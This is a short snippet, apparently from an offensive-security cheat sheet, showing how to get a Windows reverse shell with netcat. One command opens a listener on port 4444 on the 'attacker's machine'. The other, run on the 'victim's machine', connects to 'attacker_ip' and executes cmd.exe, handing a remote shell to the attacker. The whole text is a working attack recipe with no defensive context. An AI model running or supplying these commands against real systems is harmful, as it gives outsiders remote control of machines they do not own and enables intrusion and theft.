# On the attacker's machine
nc -lvp 4444

# On the victim's machine
nc attacker_ip 4444 -e cmd.exe